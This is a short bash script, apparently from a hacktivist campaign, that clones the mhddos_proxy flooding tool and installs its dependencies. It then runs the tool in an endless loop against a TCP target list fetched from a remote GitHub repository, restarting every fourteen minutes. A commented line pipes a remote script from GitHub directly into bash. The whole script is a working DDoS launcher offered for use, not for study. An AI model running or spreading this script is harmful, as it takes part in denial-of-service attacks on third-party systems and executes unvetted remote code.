#!/bin/bash
#curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/X/tcpX.sh | bash
rm -rf mhddos_proxy
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
cd mhddos_proxy
python3 -m pip install -r requirements.txt

while true
do
   pkill -f runner.py
   sleep 7
   python3 runner.py -c https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L4_tcp.lst --debug
sleep 14m
done
